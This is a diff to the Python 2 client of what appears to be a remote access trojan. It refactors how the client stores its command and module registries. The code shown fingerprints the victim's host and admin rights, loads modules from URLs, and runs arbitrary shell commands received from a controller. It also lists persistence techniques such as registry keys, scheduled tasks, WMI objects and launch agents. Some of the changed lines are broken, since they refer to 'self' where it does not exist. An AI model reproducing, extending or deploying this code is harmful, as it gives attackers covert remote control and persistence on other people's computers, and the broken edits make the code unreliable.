@@ -99,6 +99,8 @@ class Client(object):
         self.q          = long(kwargs.get('q')) or long()
         self.s          = long(kwargs.get('s')) or long()
         self.v          = bool(kwargs.get('v')) or bool()
+        self.cmds       = __command__
+        self.mods       = __modules__
         self.info       = self._info()
         self.logger     = self._logger()
         self.results    = self._results()
@@ -279,7 +281,7 @@ class Client(object):
         return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
 
     def _results(self):
-        return {module:{} for module in __modules__}
+        return {module:{} for module in self.mods}
 
     def _create_module_from_url(self, uri, name=None):
         name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
@@ -332,11 +334,11 @@ class Client(object):
 
 # ----------------- PUBLIC FUNCTIONS --------------------------
 
-    def command(fx, cx=__command__):
+    def command(fx, cx=self.cmds):
         cx.update({ fx.func_name : fx })
         return fx
 
-    def modules(fx, mx=__modules__):
+    def modules(fx, mx=self.mods):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
@@ -363,7 +365,7 @@ class Client(object):
             
     @command
     def run_modules(self):
-        mods = [self.jobs.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in __modules__ if __modules__[mod].status if sys.platform in __modules__[mod].platforms if mod not in self.jobs]
+        mods = [self.jobs.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.jobs]
         for module in mods:
             self.jobs[module].start()
         if not self.mode:
@@ -379,8 +381,8 @@ class Client(object):
             data = self._receive()
             cmd, _, action = data.partition(' ')
 
-            if cmd in __command__:
-                result = __command__[cmd](action) if len(action) else __command__[cmd]()
+            if cmd in self.cmds:
+                result = self.cmds[cmd](action) if len(action) else self.cmds[cmd]()
             else:
                 result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
 
@@ -915,10 +917,10 @@ class Client(object):
     def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
 
     @command
-    def commands(self, *x): return '\n'.join([cmd for cmd in __command__])
+    def commands(self, *x): return '\n'.join([cmd for cmd in self.cmds])
 
     @command
-    def modules(self, **x): return '\n'.join([mod for mod in __modules__])
+    def modules(self, **x): return '\n'.join([mod for mod in self.mods])
 
 # ----------------- MAIN --------------------------
 
